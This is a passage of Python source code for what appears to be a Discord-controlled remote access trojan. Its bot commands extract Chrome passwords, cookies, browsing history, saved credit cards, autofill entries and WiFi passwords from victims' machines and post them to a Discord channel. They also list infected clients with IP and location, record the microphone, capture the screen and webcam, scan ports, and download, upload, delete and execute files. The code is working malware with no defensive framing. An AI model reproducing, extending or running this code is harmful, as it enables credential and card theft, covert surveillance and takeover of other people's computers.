                    history = _browser_extractor.get_chrome_history()
                    response = "📚 **CHROME BROWSING HISTORY**\n\n"
                    
                    if history:
                        response += f"📊 **Recent {len(history)} browsing history items:**\n\n"
                        for i, item in enumerate(history[:10], 1):  # Limit to first 10
                            response += f"**{i}. 🌐 {item.get('title', 'No Title')}**\n"
                            response += f"   🔗 **URL:** {item.get('url', 'N/A')}\n"
                            response += f"   📈 **Visits:** {item.get('visit_count', 0)}\n"
                            response += f"   🕒 **Last Visit:** {item.get('last_visit', 'N/A')}\n"
                            response += "   " + "─" * 40 + "\n"
                        
                        if len(history) > 10:
                            response += f"\n... and {len(history) - 10} more history items\n"
                            response += "📋 **Use `.show_more` to view all history**"
                    else:
                        response += "❌ No Chrome history found or Chrome not installed\n"
                    
                    asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
                    
                except Exception as e:
                    error_msg = f"❌ Chrome history extraction error: {str(e)}"
                    asyncio.run_coroutine_threadsafe(ctx.send(error_msg), self.bot.loop)
            
            _command_orchestrator.start_command(execute_chrome_history)
            await ctx.send("⚡ **Extracting Chrome history...**")
        
        @self.bot.command(name='chrome_credit_cards')
        async def chrome_credit_cards_command(ctx):
            """Extract Chrome saved credit cards"""
            def execute_chrome_credit_cards():
                try:
                    cards = _browser_extractor.get_chrome_credit_cards()
                    response = "💳 **CHROME SAVED CREDIT CARDS**\n\n"
                    
                    if cards:
                        response += f"📊 **Found {len(cards)} saved credit cards:**\n\n"
                        for i, card in enumerate(cards, 1):
                            response += f"**{i}. 👤 {card.get('name', 'No Name')}**\n"
                            response += f"   💳 **Card Number:** `{card.get('card_number', 'N/A')}`\n"
                            response += f"   📅 **Expiry:** `{card.get('expiry', 'N/A')}`\n"
                            response += "   " + "─" * 40 + "\n"
                    else:
                        response += "❌ No Chrome credit cards found or Chrome not installed\n"
                    
                    asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
                    
                except Exception as e:
                    error_msg = f"❌ Chrome credit card extraction error: {str(e)}"
                    asyncio.run_coroutine_threadsafe(ctx.send(error_msg), self.bot.loop)
            
            _command_orchestrator.start_command(execute_chrome_credit_cards)
            await ctx.send("⚡ **Extracting Chrome credit cards...**")
        
        @self.bot.command(name='chrome_autofill')
        async def chrome_autofill_command(ctx):
            """Extract Chrome autofill data"""
            def execute_chrome_autofill():
                try:
                    autofill = _browser_extractor.get_chrome_autofill()
                    response = "📝 **CHROME AUTOFILL DATA**\n\n"
                    
                    if autofill:
                        response += f"📊 **Found {len(autofill)} autofill entries:**\n\n"
                        for i, entry in enumerate(autofill[:15], 1):  # Limit to first 15
                            response += f"**{i}. {entry.get('field', 'N/A')}**\n"
                            response += f"   📋 **Value:** `{entry.get('value', 'N/A')}`\n"
                            response += "   " + "─" * 40 + "\n"
                        
                        if len(autofill) > 15:
                            response += f"\n... and {len(autofill) - 15} more autofill entries\n"
                            response += "📋 **Use `.show_more` to view all autofill data**"
                    else:
                        response += "❌ No Chrome autofill data found or Chrome not installed\n"
                    
                    asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
                    
                except Exception as e:
                    error_msg = f"❌ Chrome autofill extraction error: {str(e)}"
                    asyncio.run_coroutine_threadsafe(ctx.send(error_msg), self.bot.loop)
            
            _command_orchestrator.start_command(execute_chrome_autofill)
            await ctx.send("⚡ **Extracting Chrome autofill data...**")
        
        @self.bot.command(name='browser_all')
        async def browser_all_command(ctx):
            """Extract ALL browser data comprehensively"""
            def execute_browser_all():
                try:
                    all_data = _browser_extractor.get_comprehensive_browser_data()
                    response = "🌐 **COMPREHENSIVE BROWSER DATA EXTRACTION**\n\n"
                    
                    for browser, data in all_data.items():
                        response += f"**{browser.upper()}**\n"
                        
                        if isinstance(data, dict) and 'status' in data:
                            if data['status'] == 'Extracted Successfully':
                                # Chrome specific data
                                if 'passwords' in data and data['passwords']:
                                    response += f"🔑 **Passwords:** {len(data['passwords'])} found\n"
                                if 'cookies' in data and data['cookies']:
                                    response += f"🍪 **Cookies:** {len(data['cookies'])} found\n"
                                if 'history' in data and data['history']:
                                    response += f"📚 **History:** {len(data['history'])} items\n"
                                if 'credit_cards' in data and data['credit_cards']:
                                    response += f"💳 **Credit Cards:** {len(data['credit_cards'])} found\n"
                                if 'autofill' in data and data['autofill']:
                                    response += f"📝 **Autofill:** {len(data['autofill'])} entries\n"
                            else:
                                response += f"📊 **Status:** {data['status']}\n"
                        else:
                            response += f"📊 **Status:** {data}\n"
                        
                        response += "─" * 50 + "\n\n"
                    
                    response += "💡 **Use specific commands for detailed data:**\n"
                    response += "`.chrome_passwords` - Get detailed passwords\n"
                    response += "`.chrome_cookies` - Get detailed cookies\n"
                    response += "`.chrome_history` - Get browsing history\n"
                    response += "`.chrome_credit_cards` - Get saved credit cards\n"
                    response += "`.chrome_autofill` - Get autofill data\n"
                    
                    asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
                    
                except Exception as e:
                    error_msg = f"❌ Comprehensive browser data extraction error: {str(e)}"
                    asyncio.run_coroutine_threadsafe(ctx.send(error_msg), self.bot.loop)
            
            _command_orchestrator.start_command(execute_browser_all)
            await ctx.send("⚡ **Extracting ALL browser data...**")
        
        @self.bot.command(name='get_browser')
        async def get_browser_command(ctx):
            """Legacy command - redirect to browser_all"""
            await ctx.send("🔄 **Redirecting to comprehensive browser data extraction...**")
            await browser_all_command(ctx)
        
        # ========== MULTI-COMMAND MANAGEMENT COMMANDS ==========
        @self.bot.command(name='commands')
        async def commands_command(ctx):
            """Show all active commands"""
            active_commands = _command_orchestrator.get_active_commands()
            
            if not active_commands:
                await ctx.send("⚡ **No active commands running**")
                return
            
            response = "**⚡ ACTIVE COMMANDS:**\n\n"
            for cmd_id, cmd_data in active_commands.items():
                duration = time.time() - cmd_data["start_time"]
                response += f"**{cmd_id}** - {cmd_data['type']} - Running for {duration:.1f}s\n"
                if 'args' in cmd_data and cmd_data['args']:
                    response += f"   Args: {cmd_data['args']}\n"
            
            await self.send_long_message(ctx, response)
        
        @self.bot.command(name='stopcmd')
        async def stopcmd_command(ctx, command_id):
            """Stop a specific command"""
            if _command_orchestrator.stop_command(command_id):
                await ctx.send(f"✅ **Command stopped:** `{command_id}`")
            else:
                await ctx.send(f"❌ **Command not found:** `{command_id}`")
        
        @self.bot.command(name='stopall')
        async def stopall_command(ctx):
            """Stop all active commands"""
            _command_orchestrator.stop_all_commands()
            await ctx.send("✅ **All commands stopped**")
        
        # ========== VOICE RECORDING COMMANDS ==========
        @self.bot.command(name='voice_start')
        async def voice_start_command(ctx, interval: int = 30):
            """Start voice recording"""
            global _voice_recording_service
            if _voice_recording_service and _voice_recording_service.start_recording(interval):
                await ctx.send(f"🎤 **Voice recording started** - Sending every {interval} seconds")
            else:
                await ctx.send("❌ **Failed to start voice recording**")
        
        @self.bot.command(name='voice_stop')
        async def voice_stop_command(ctx):
            """Stop voice recording"""
            global _voice_recording_service
            if _voice_recording_service:
                _voice_recording_service.stop_recording()
                await ctx.send("✅ **Voice recording stopped**")
            else:
                await ctx.send("❌ **Voice recorder not available**")
        
        # ========== CLIENT MANAGEMENT COMMANDS ==========
        @self.bot.command(name='clients')
        async def clients_command(ctx):
            """List all connected clients"""
            def execute_clients():
                clients = _client_management_service.list_clients()
                active_client = _client_management_service.get_active_client()
                
                if not clients:
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ No clients connected"), self.bot.loop)
                    return
                    
                response = "**👥 CONNECTED CLIENTS:**\n\n"
                
                for device_id, client_data in clients.items():
                    client_info = client_data["info"]
                    status = "🟢 ONLINE" if client_data["online"] else "🔴 OFFLINE"
                    active_indicator = " ⭐ ACTIVE" if device_id == _client_management_service.active_client else ""
                    
                    response += f"**{device_id}** - {status}{active_indicator}\n"
                    response += f"   👤 User: {client_info.get('user', 'Unknown')}\n"
                    response += f"   💻 Host: {client_info.get('host', 'Unknown')}\n"
                    response += f"   🖥️ OS: {client_info.get('os', 'Unknown')}\n"
                    response += f"   🌐 IP: {client_info.get('ip', 'Unknown')}\n"
                    response += f"   🌍 Country: {client_info.get('real_ip_info', {}).get('country', 'Unknown')}\n"
                    response += f"   🏙️ City: {client_info.get('real_ip_info', {}).get('city', 'Unknown')}\n"
                    response += f"   ⏰ Last Seen: {time.ctime(client_data['last_seen'])}\n\n"
                
                asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
            
            _command_orchestrator.start_command(execute_clients)
            await ctx.send("⚡ **Fetching clients list...**")
        
        @self.bot.command(name='switch')
        async def switch_command(ctx, device_id):
            """Switch to a specific client"""
            def execute_switch():
                if _client_management_service.set_active_client(device_id):
                    active_client = _client_management_service.get_active_client()
                    if active_client:
                        client_info = active_client["info"]
                        response = (f"✅ **Switched to Client:** `{device_id}`\n"
                                   f"👤 **User:** {client_info.get('user', 'Unknown')}\n"
                                   f"💻 **Host:** {client_info.get('host', 'Unknown')}\n"
                                   f"🖥️ **OS:** {client_info.get('os', 'Unknown')}\n"
                                   f"🌐 **IP:** {client_info.get('ip', 'Unknown')}\n"
                                   f"🌍 **Country:** {client_info.get('real_ip_info', {}).get('country', 'Unknown')}\n"
                                   f"🏙️ **City:** {client_info.get('real_ip_info', {}).get('city', 'Unknown')}")
                    else:
                        response = f"✅ Switched to client: `{device_id}`"
                else:
                    response = f"❌ Client not found: `{device_id}`"
                
                asyncio.run_coroutine_threadsafe(ctx.send(response), self.bot.loop)
            
            _command_orchestrator.start_command(execute_switch)
            await ctx.send("⚡ **Switching client...**")

        @self.bot.command(name='active')
        async def active_command(ctx):
            """Show active client information"""
            def execute_active():
                active_client = _client_management_service.get_active_client()
            
                if not active_client:
                    asyncio.run_coroutine_threadsafe(ctx.send("❌ No active client selected"), self.bot.loop)
                    return
                
                client_info = active_client["info"]
                response = "**⭐ ACTIVE CLIENT INFORMATION:**\n\n"
                response += f"**Device ID:** `{_client_management_service.active_client}`\n"
                response += f"**User:** {client_info.get('user', 'Unknown')}\n"
                response += f"**Host:** {client_info.get('host', 'Unknown')}\n"
                response += f"**OS:** {client_info.get('os', 'Unknown')}\n"
                response += f"**IP:** {client_info.get('ip', 'Unknown')}\n"
                response += f"**Country:** {client_info.get('real_ip_info', {}).get('country', 'Unknown')}\n"
                response += f"**City:** {client_info.get('real_ip_info', {}).get('city', 'Unknown')}\n"
                response += f"**Admin:** {'✅ Yes' if client_info.get('admin') else '❌ No'}\n"
                response += f"**Last Seen:** {time.ctime(active_client['last_seen'])}\n"
                response += f"**Status:** {'🟢 ONLINE' if active_client['online'] else '🔴 OFFLINE'}"
            
                asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
        
            _command_orchestrator.start_command(execute_active)
            await ctx.send("⚡ **Fetching active client info...**")
    
        # ========== SYSTEM INFORMATION COMMANDS ==========
        @self.bot.command(name='sysinfo')
        async def sysinfo_command(ctx):
            """Get comprehensive system information"""
            def execute_sysinfo():
                data = _system_info_service.gather_comprehensive_system_info()
                formatted_data = self.format_system_info(data)
                asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, formatted_data), self.bot.loop)
        
            _command_orchestrator.start_command(execute_sysinfo)
            await ctx.send("⚡ **Collecting system information...**")
    
        @self.bot.command(name='processes')
        async def processes_command(ctx):
            """Get detailed process list"""
            def execute_processes():
                processes = _system_info_service.get_detailed_process_list()
                response = "**🔄 RUNNING PROCESSES:**\n\n"
                for i, proc in enumerate(processes[:20]):
                    response += f"**{i+1}. {proc['name']}** (PID: {proc['pid']})\n"
                    response += f"   👤 User: {proc.get('username', 'N/A')}\n"
                    response += f"   🧠 CPU: {proc.get('cpu_percent', 0):.1f}% | 💾 RAM: {proc.get('memory_percent', 0):.1f}%\n"
                    response += f"   📊 Memory: {proc.get('memory_usage', 0) / (1024*1024):.1f} MB\n"
                    response += f"   🕒 Created: {datetime.fromtimestamp(proc.get('create_time', 0)).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
                asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
        
            _command_orchestrator.start_command(execute_processes)
            await ctx.send("⚡ **Fetching process list...**")
    
        @self.bot.command(name='services')
        async def services_command(ctx):
            """List Windows services"""
            def execute_services():
                try:
                    output = subprocess.check_output("sc query", shell=True, stderr=subprocess.STDOUT, timeout=30)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"```{output.decode('utf-8', errors='ignore')[:1900]}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_services)
            await ctx.send("⚡ **Fetching services...**")
    
        @self.bot.command(name='drivers')
        async def drivers_command(ctx):
            """List loaded drivers"""
            def execute_drivers():
                try:
                    output = subprocess.check_output("driverquery", shell=True, stderr=subprocess.STDOUT, timeout=30)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"```{output.decode('utf-8', errors='ignore')[:1900]}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_drivers)
            await ctx.send("⚡ **Fetching drivers...**")
    
        @self.bot.command(name='installed')
        async def installed_command(ctx):
            """List installed software"""
            def execute_installed():
                try:
                    cmd = 'wmic product get name,version,vendor /format:csv'
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"```{output.decode('utf-8', errors='ignore')[:1900]}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_installed)
            await ctx.send("⚡ **Fetching installed software...**")
    
        # ========== REAL DATA EXTRACTION COMMANDS ==========
        @self.bot.command(name='get_passwords')
        async def get_passwords_command(ctx):
            """Comprehensive password recovery"""
            def execute_get_passwords():
                try:
                    response = "🔐 **COMPREHENSIVE PASSWORD RECOVERY**\n\n"
                
                    # Chrome Passwords
                    chrome_passwords = _browser_extractor.get_chrome_passwords()
                    response += "**🌐 CHROME PASSWORDS:**\n"
                    if chrome_passwords:
                        for pwd in chrome_passwords[:10]:  # Limit to first 10
                            response += f"📧 {pwd.get('username', 'N/A')}\n"
                            response += f"🌐 {pwd.get('url', 'N/A')}\n"
                            response += f"🔑 {pwd.get('password', 'N/A')}\n"
                            response += "─" * 40 + "\n"
                    else:
                        response += "❌ No Chrome passwords found\n"
                
                    # WiFi Passwords
                    wifi_profiles = _browser_extractor.get_wifi_passwords()
                    response += "\n**📡 WIFI PASSWORDS:**\n"
                    if wifi_profiles:
                        for profile in wifi_profiles[:10]:
                            response += f"📶 {profile.get('ssid', 'Unknown')} → 🔑 {profile.get('password', 'No Password')}\n"
                    else:
                        response += "❌ No WiFi passwords found\n"
                
                    asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
                
                except Exception as e:
                    error_msg = f"❌ Password recovery error: {str(e)}"
                    asyncio.run_coroutine_threadsafe(ctx.send(error_msg), self.bot.loop)
        
            _command_orchestrator.start_command(execute_get_passwords)
            await ctx.send("⚡ **Recovering passwords...**")
    
        @self.bot.command(name='wifi')
        async def wifi_command(ctx):
            """Get REAL WiFi passwords"""
            def execute_wifi():
                try:
                    wifi_profiles = _browser_extractor.get_wifi_passwords()
                    response = "📡 **REAL WIFI PASSWORDS**\n\n"
                
                    if wifi_profiles:
                        for profile in wifi_profiles:
                            ssid = profile.get('ssid', 'Unknown')
                            password = profile.get('password', 'No Password')
                            auth = profile.get('authentication', 'Unknown')
                            response += f"📶 **SSID:** {ssid}\n"
                            response += f"🔑 **Password:** {password}\n"
                            response += f"🔒 **Authentication:** {auth}\n"
                            response += "─" * 40 + "\n"
                    else:
                        response += "❌ No WiFi profiles found or extraction failed\n"
                
                    asyncio.run_coroutine_threadsafe(self.send_long_message(ctx, response), self.bot.loop)
                
                except Exception as e:
                    error_msg = f"❌ WiFi password extraction error: {str(e)}"
                    asyncio.run_coroutine_threadsafe(ctx.send(error_msg), self.bot.loop)
        
            _command_orchestrator.start_command(execute_wifi)
            await ctx.send("⚡ **Extracting REAL WiFi passwords...**")
    
        # ========== FILE OPERATIONS ==========
        @self.bot.command(name='ls')
        async def ls_command(ctx, path=None):
            """List directory contents"""
            def execute_ls():
                global _file_explorer_location
            
                try:
                    if not _file_explorer_location:
                        _file_explorer_location = os.path.expanduser("~")

                    target_path = path if path else _file_explorer_location

                    if not os.path.isabs(target_path):
                        target_path = os.path.join(_file_explorer_location, target_path)
                
                    target_path = os.path.abspath(target_path)
                
                    if not os.path.exists(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ Path does not exist"), self.bot.loop)
                        return
                
                    if os.path.isfile(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send(f"📄 {os.path.basename(target_path)} - {os.path.getsize(target_path)} bytes"), self.bot.loop)
                        return
                    
                    # Update global if we listed a directory successfully (implicitly cd basic)
                    # No, strict ls should not cd, but we update for relative paths context? No.
                    
                    items = []
                    for item in os.listdir(target_path):
                        item_path = os.path.join(target_path, item)
                        if os.path.isdir(item_path):
                            items.append(f"📁 {item}/")
                        else:
                            size = os.path.getsize(item_path)
                            items.append(f"📄 {item} - {size} bytes")
                
                    _file_explorer_location = path
                
                    output = f"📂 {path}\n\n" + "\n".join(items)
                    if len(output) > 1900:
                        for i in range(0, len(output), 1900):
                            asyncio.run_coroutine_threadsafe(ctx.send(f"```{output[i:i+1900]}```"), self.bot.loop)
                    else:
                        asyncio.run_coroutine_threadsafe(ctx.send(f"```{output}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_ls)
            await ctx.send("⚡ **Listing directory...**")
    
        @self.bot.command(name='cd')
        async def cd_command(ctx, path=None):
            """Change directory"""
            def execute_cd():
                global _file_explorer_location
            
                try:
                    target_path = path if path else os.path.expanduser("~")
                    
                    # Guard for global state
                    if not _file_explorer_location:
                         _file_explorer_location = os.path.expanduser("~")

                    if not os.path.isabs(target_path):
                        target_path = os.path.join(_file_explorer_location, target_path)
                
                    target_path = os.path.abspath(target_path)
                
                    if not os.path.exists(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ Path does not exist"), self.bot.loop)
                        return
                
                    if not os.path.isdir(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ Not a directory"), self.bot.loop)
                        return
                
                    _file_explorer_location = target_path
                    asyncio.run_coroutine_threadsafe(ctx.send(f"📂 Current directory: {_file_explorer_location}"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_cd)
            await ctx.send("⚡ **Changing directory...**")
    
        @self.bot.command(name='download')
        async def download_command(ctx, file_path):
            """Download a file"""
            def execute_download():
                try:
                    target_path = file_path
                    if not os.path.isabs(target_path):
                        target_path = os.path.join(_file_explorer_location, target_path)
                
                    target_path = os.path.abspath(target_path)
                
                    if not os.path.exists(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ File not found"), self.bot.loop)
                        return
                
                    if os.path.isdir(target_path):
                        zip_path = shutil.make_archive(target_path + "_archive", 'zip', target_path)
                        asyncio.run_coroutine_threadsafe(ctx.send(file=File(zip_path)), self.bot.loop)
                        os.remove(zip_path)
                    else:
                        asyncio.run_coroutine_threadsafe(ctx.send(file=File(target_path)), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_download)
            await ctx.send("⚡ **Preparing download...**")
    
        @self.bot.command(name='upload')
        async def upload_command(ctx):
            """Upload a file - FIXED VERSION"""
            if not ctx.message.attachments:
                await ctx.send("❌ Please attach a file to upload")
                return
        
            attachment = ctx.message.attachments[0]
            attachment_url = attachment.url
            token = ctx.bot.http.token
        
            def execute_upload():
                try:
                    headers = {'Authorization': f'Bot {token}'}
                    response = requests.get(attachment_url, headers=headers, timeout=30)
                    if response.status_code == 200:
                        file_path = os.path.join(_file_explorer_location, attachment.filename)
                        with open(file_path, 'wb') as f:
                            f.write(response.content)
                        asyncio.run_coroutine_threadsafe(ctx.send(f"✅ File uploaded: {file_path}"), self.bot.loop)
                    else:
                        asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Failed to download file: {response.status_code}"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_upload)
            await ctx.send("⚡ **Uploading file...**")
    
        @self.bot.command(name='search')
        async def search_command(ctx, pattern):
            """Search for files"""
            def execute_search():
                try:
                    matches = []
                    for root, dirnames, filenames in os.walk(_file_explorer_location):
                        for filename in fnmatch.filter(filenames, pattern):
                            matches.append(os.path.join(root, filename))
                        if len(matches) > 50:
                            break
                
                    if matches:
                        output = f"🔍 Found {len(matches)} files matching '{pattern}':\n\n" + "\n".join(matches[:20])
                        if len(matches) > 20:
                            output += f"\n\n... and {len(matches) - 20} more"
                    
                        if len(output) > 1900:
                            for i in range(0, len(output), 1900):
                                asyncio.run_coroutine_threadsafe(ctx.send(f"```{output[i:i+1900]}```"), self.bot.loop)
                        else:
                            asyncio.run_coroutine_threadsafe(ctx.send(f"```{output}```"), self.bot.loop)
                    else:
                        asyncio.run_coroutine_threadsafe(ctx.send(f"❌ No files found matching '{pattern}'"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_search)
            await ctx.send("⚡ **Searching files...**")
    
        @self.bot.command(name='read')
        async def read_command(ctx, file_path):
            """Read a text file"""
            def execute_read():
                try:
                    target_path = file_path
                    if not os.path.isabs(target_path):
                        target_path = os.path.join(_file_explorer_location, target_path)
                
                    target_path = os.path.abspath(target_path)
                
                    if not os.path.exists(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ File not found"), self.bot.loop)
                        return
                
                    if os.path.isdir(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ Cannot read a directory"), self.bot.loop)
                        return
                
                    if os.path.getsize(target_path) > 10000000:
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ File too large to read"), self.bot.loop)
                        return
                
                    with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                
                    if len(content) > 1900:
                        for i in range(0, len(content), 1900):
                            asyncio.run_coroutine_threadsafe(ctx.send(f"```{content[i:i+1900]}```"), self.bot.loop)
                    else:
                        asyncio.run_coroutine_threadsafe(ctx.send(f"```{content}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_read)
            await ctx.send("⚡ **Reading file...**")
    
        @self.bot.command(name='delete')
        async def delete_command(ctx, file_path):
            """Delete a file"""
            def execute_delete():
                try:
                    target_path = file_path
                    if not os.path.isabs(target_path):
                        target_path = os.path.join(_file_explorer_location, target_path)
                
                    target_path = os.path.abspath(target_path)
                
                    if not os.path.exists(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ File not found"), self.bot.loop)
                        return
                
                    if os.path.isdir(target_path):
                        shutil.rmtree(target_path)
                    else:
                        os.remove(target_path)
                
                    asyncio.run_coroutine_threadsafe(ctx.send(f"✅ Deleted: {file_path}"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_delete)
            await ctx.send("⚡ **Deleting file...**")
    
        @self.bot.command(name='execute')
        async def execute_command(ctx, file_path):
            """Execute a file"""
            def execute_execute():
                try:
                    target_path = file_path
                    if not os.path.isabs(target_path):
                        target_path = os.path.join(_file_explorer_location, target_path)
                
                    target_path = os.path.abspath(target_path)
                
                    if not os.path.exists(target_path):
                        asyncio.run_coroutine_threadsafe(ctx.send("❌ File not found"), self.bot.loop)
                        return
                
                    subprocess.Popen(target_path, shell=True)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"✅ Executed: {target_path}"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_execute)
            await ctx.send("⚡ **Executing file...**")
    
        # ========== NETWORK OPERATIONS ==========
        @self.bot.command(name='netstat')
        async def netstat_command(ctx):
            """Show network connections"""
            def execute_netstat():
                try:
                    output = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.STDOUT, timeout=30)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"```{output.decode('utf-8', errors='ignore')[:1900]}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_netstat)
            await ctx.send("⚡ **Fetching network connections...**")
    
        @self.bot.command(name='portscan')
        async def portscan_command(ctx, target):
            """Scan ports on a target (Threaded)"""
            if not target: return
            scan_target = target
            if scan_target.lower() in ["any", ".", "localhost"]: scan_target = "127.0.0.1"

            asyncio.run_coroutine_threadsafe(ctx.send(f"🔍 **Scanning {scan_target} (Fast Mode)...**"), self.bot.loop)

            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((scan_target, port))
                    sock.close()
                    return port if result == 0 else None
                except: return None

            def execute_portscan():
                try:
                    open_ports = []
                    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8000]
                    
                    with ThreadPoolExecutor(max_workers=20) as executor:
                        futures = {executor.submit(scan_port, port): port for port in common_ports}
                        for future in as_completed(futures):
                            p = future.result()
                            if p: open_ports.append(p)
                    
                    open_ports.sort()
                    if open_ports:
                        asyncio.run_coroutine_threadsafe(ctx.send(f"✅ **Open Ports on {scan_target}:**\n{', '.join(map(str, open_ports))}"), self.bot.loop)
                    else:
                        asyncio.run_coroutine_threadsafe(ctx.send(f"❌ No open ports found on {scan_target}"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Scan error: {e}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_portscan)
            await ctx.send("⚡ **Starting port scan...**")
    
        @self.bot.command(name='arp')
        async def arp_command(ctx):
            """Show ARP table"""
            def execute_arp():
                try:
                    output = subprocess.check_output("arp -a", shell=True, stderr=subprocess.STDOUT, timeout=30)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"```{output.decode('utf-8', errors='ignore')[:1900]}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_arp)
            await ctx.send("⚡ **Fetching ARP table...**")
    
        @self.bot.command(name='dns')
        async def dns_command(ctx):
            """Show DNS cache"""
            def execute_dns():
                try:
                    output = subprocess.check_output("ipconfig /displaydns", shell=True, stderr=subprocess.STDOUT, timeout=30)
                    asyncio.run_coroutine_threadsafe(ctx.send(f"```{output.decode('utf-8', errors='ignore')[:1900]}```"), self.bot.loop)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Error: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_dns)
            await ctx.send("⚡ **Fetching DNS cache...**")
    
        # ========== SYSTEM MONITORING ==========
        @self.bot.command(name='screenshot')
        async def screenshot_command(ctx):
            """Take a screenshot"""
            def execute_screenshot():
                try:
                    screenshot = ImageGrab.grab()
                    buffered = io.BytesIO()
                    screenshot.save(buffered, format="JPEG", quality=85)
                
                    temp_file = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.jpg")
                    with open(temp_file, "wb") as f:
                        f.write(buffered.getvalue())
                
                    asyncio.run_coroutine_threadsafe(ctx.send(file=File(temp_file)), self.bot.loop)
                    os.remove(temp_file)
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(ctx.send(f"❌ Screenshot failed: {str(e)}"), self.bot.loop)
        
            _command_orchestrator.start_command(execute_screenshot)
            await ctx.send("⚡ **Capturing screenshot...**")
    
        @self.bot.command(name='webcam')
        async def webcam_command(ctx):
            """Capture webcam image (Optimized)"""
            def execute_webcam():
                try:
                    import cv2
                    # Use CAP_DSHOW for faster initialization on Windows
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    # Set resolution slightly lower for speed
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                    
                    if cap.isOpened():
                        # Read minimal frames to settle sensor
                        for _ in range(2): cap.read()
                        
                        ret, frame = cap.read()
                        cap.release() # Release IMMEDIATELY
                        
                        if ret:
                            _, buffer = cv2.imencode('.jpg', frame)
                            temp_file = os.path.join(tempfile.gettempdir(), f"cam_{int(time.time())}.jpg")
                            with open(temp_file, "wb") as f: f.write(buffer.tobytes())
                            asyncio.run_coroutine_threadsafe(ctx.send(file=File(temp_file)), self.bot.loop)
                            os.remove(temp_file)
                        else:
                            asyncio.run_coroutine_threadsafe(ctx.send("❌ Webcam capture returned empty frame"), self.bot.loop)
                    else:
